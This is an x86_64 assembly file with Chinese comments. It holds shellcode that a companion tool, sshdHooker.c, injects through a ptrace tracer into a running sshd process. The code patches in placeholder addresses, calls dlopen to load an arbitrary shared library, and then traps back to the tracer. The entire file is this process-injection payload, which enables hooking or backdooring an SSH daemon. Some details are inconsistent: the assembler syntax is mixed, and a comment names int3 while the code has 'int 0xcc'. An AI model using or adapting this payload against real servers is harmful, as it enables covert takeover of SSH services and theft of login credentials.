# x86_64 注入用 shellcode
#
# 布局约束(与 sshdHooker.c 的注入逻辑强耦合):
#   - _inject_start_s 开头是 9 字节 nop 滑道, 注入后 rip 指向
#     shellcode+6, 从 nop 中间进入也能滑到正式指令
#   - _dlopen_mode_param1_s / _dlopen_mode_addr_s 两处 mov 的 64 位
#     立即数只是占位值, 注入器会定位到 标签+2(跳过 2 字节操作码)
#     把真实地址覆盖进去
#   - dlopen 返回后执行 int 0x80 + int3 触发 trap, 让注入器收回控制权
.intel_syntax noprefix
.global _dlopen_mode_addr_s
.global _dlopen_mode_param1_s
.global _inject_start_s
.global _inject_end_s
.global _printf_addr_s
.data
_inject_start_s:
        nop                     # 9 字节 nop 滑道
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        push   %rbp
        sub    %rsp, 0x8
        add    %rsp, 0x8
        mov    %rsi, 0x2        # rsi = RTLD_NOW(2), dlopen 的第二个参数
_dlopen_mode_param1_s:
        mov    %rdi,0x1122334455667788   # 占位: so 路径地址, 注入时覆盖为真实地址
_dlopen_mode_addr_s:
        movabs %rax,0x1122334455667788   # 占位: 远程 dlopen 地址, 注入时覆盖为真实地址
        call %rax              # dlopen(so_path, RTLD_NOW)
        int 0x80               # 触发 trap, 让 tracer 收回控制权
        int 0xcc
_inject_end_s:
.space 0x400, 0                # 预留空间, 避免注入写入/执行越界
.end
